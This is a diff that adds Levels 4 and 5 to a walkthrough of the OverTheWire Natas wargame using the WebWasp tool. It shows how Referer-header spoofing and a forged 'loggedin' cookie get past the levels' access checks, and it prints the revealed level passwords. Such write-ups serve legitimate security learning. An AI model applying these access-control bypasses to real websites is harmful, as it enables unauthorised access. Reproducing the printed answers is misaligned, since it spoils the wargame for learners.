@@ -14,7 +14,9 @@ The intent for this walkthrough is to demonstrate WebWasp's abilities in a "real
 - [Level 1](#level-1) (More authentication)
 - [Level 2](#level-2) (Finding links)
 - [Level 3](#level-3) (robots.txt)
-- [Level 4](#level-4)
+- [Level 4](#level-4) (The referer header)
+- [Level 5](#level-5) (Cookies! 🍪)
+- [Level 6](#level-6)
 
 ## Level 0
 
@@ -451,3 +453,155 @@ natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
 Save the password in a variable called `pass4` and we're done!
 
 ## Level 4
+
+Same process as before. Let's check out the source for this level:
+
+```HTML
+<html>
+<head>
+-- truncated --
+</head>
+<body>
+<h1>natas4</h1>
+<div id="content">
+
+Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
+<br/>
+<div id="viewsource"><a href="index.php">Refresh page</a></div>
+</div>
+</body>
+</html>
+```
+
+Hmm. This time we were disallowed access because we weren't coming from the right link...
+
+What this is referencing is the `referer` tag within the header of an HTTP request.
+
+WebWasp makes setting these header fields easy, as we've already seen with the `auth-user` and `auth-pass` fields.
+
+Let's set the `referer` field the same way:
+
+```
+> headers set referer http://natas5.natas.labs.overthewire.org/
+[🐝] Set header field:
+   referer : 'http://natas5.natas.labs.overthewire.org/'
+```
+
+and try again:
+
+```
+> get http://natas4.natas.labs.overthewire.org/                
+[🐝] Sending GET request to http://natas4.natas.labs.overthewire.org/...
+[🐝] GET request completed. Status code: 200 (OK)
+[🐝] Response captured! Type 'response show' for summary
+```
+```HTML
+> response show -t
+<html>
+<head>
+-- truncated --
+</head>
+<body>
+<h1>natas4</h1>
+<div id="content">
+
+Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
+<br/>
+<div id="viewsource"><a href="index.php">Refresh page</a></div>
+</div>
+</body>
+</html>
+```
+
+Too easy! WebWasp makes crafting header fields very simple.
+
+Save that password into `pass5` and we're onto the next one.
+
+## Level 5
+
+Since we don't necessarily want to use the same `referer` tag from the previous level, let's go ahead and unset it before we make out get request to level 5:
+
+```
+> headers unset referer 
+[🐝] Unset header field:
+   referer
+```
+
+Now once we update our auth headers, we're good to go and make our get request again.
+
+```
+> get http://natas5.natas.labs.overthewire.org/ 
+```
+```HTML
+> response show -t
+<html>
+<head>
+-- truncated --
+</head>
+<body>
+<h1>natas5</h1>
+<div id="content">
+Access disallowed. You are not logged in</div>
+</body>
+</html>
+```
+
+Not logged in... I thought we logged in with the auth credentials!
+
+Well if those had failed, the site would've returned us another `401` status code, but we got a `200`! So what gives?
+
+There must be some other check going on here that pertains to a log in.
+
+Many times, a session id or login is stored within a sites _cookies_ 🍪. Cookies are small bits of information that are typically stored within your browser.
+
+Your browser will pass these cookies to sites to help remember things like your login or certain passwords!
+
+We can inspect the cookies we received from the get request by using the response command with a new option:
+
+```
+> response show -c
+[🐝] Response cookies:
+   loggedin     : 0
+```
+
+Sure enough, this site uses a cookie called `loggedin`! This tells us that the `loggedin` value we provided was `0`. Maybe we need to set this to something non-zero to trick the website into thinking we're logged in!
+
+We can do this by using WebWasp's `cookies` command. We'll go ahead and add a cookie with the same name as in the response, with a value of `1` instead of `0`:
+
+```
+> cookies add loggedin 1
+[🍪] Added cookie:
+   'loggedin' : '1'
+```
+
+Now when we make our get request again, this cookie will be passed along with it, just like our headers!
+
+```
+> get http://natas5.natas.labs.overthewire.org/
+[🐝] Sending GET request to http://natas5.natas.labs.overthewire.org/...
+[🐝] GET request completed. Status code: 200 (OK)
+[🐝] Response captured! Type 'response show' for summary
+```
+```HTML
+> response show -t
+<html>
+<head>
+-- truncated --
+</head>
+<body>
+<h1>natas5</h1>
+<div id="content">
+Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR</div>
+</body>
+</html>
+```
+
+Boom! We've successfully passed our custom-baked cookie to satisfy the websites requirement.
+
+Save the password into `pass6` and we'll press on!
+
+# Level 6
+
+---
+
+[Back to Top](#contents)
